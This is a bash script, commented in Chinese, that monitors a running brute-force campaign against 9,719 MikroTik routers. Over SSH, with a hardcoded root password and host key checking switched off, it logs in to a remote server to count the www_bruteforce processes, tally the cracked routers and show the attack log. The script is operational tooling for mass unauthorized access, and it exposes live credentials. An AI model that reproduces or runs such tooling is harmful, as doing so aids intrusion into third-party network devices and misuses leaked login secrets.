#!/bin/bash
# 监控30并发MikroTik爆破进度

TARGET_IP="82.29.71.156"
TARGET_USER="root"
TARGET_PASS='@admin123'

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

while true; do
    clear
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}    MikroTik 批量爆破监控 (30并发稳定模式)${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # 运行状态
    PROCS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'ps aux | grep www_bruteforce | grep -v grep | wc -l' 2>/dev/null)
    echo -e "${CYAN}[运行状态]${NC}"
    echo -e "  并发进程: ${GREEN}${PROCS}${NC}/30"
    
    # 系统负载
    LOAD=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'uptime | awk -F"average:" "{print \$2}"' 2>/dev/null)
    echo -e "  系统负载:${LOAD}"
    
    # 成功数量
    SUCCESS=$(sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'find /root/mikrotik_ecsrp5_toolkit/results/ -type f -exec cat {} \; 2>/dev/null | sort -u | wc -l' 2>/dev/null)
    echo -e "  已破解: ${GREEN}${SUCCESS}${NC} 个路由器"
    echo ""
    
    # 最新日志
    echo -e "${YELLOW}[最新进度]${NC}"
    sshpass -p "${TARGET_PASS}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${TARGET_USER}@${TARGET_IP} 'tail -20 /root/mikrotik_ecsrp5_toolkit/stable_brute.log 2>/dev/null' 2>/dev/null
    
    echo ""
    echo -e "${BLUE}[信息]${NC}"
    echo -e "  目标总数: 9719"
    echo -e "  预计时间: 7-8小时"
    echo -e "  10秒后刷新... (Ctrl+C 退出)"
    
    sleep 10
done
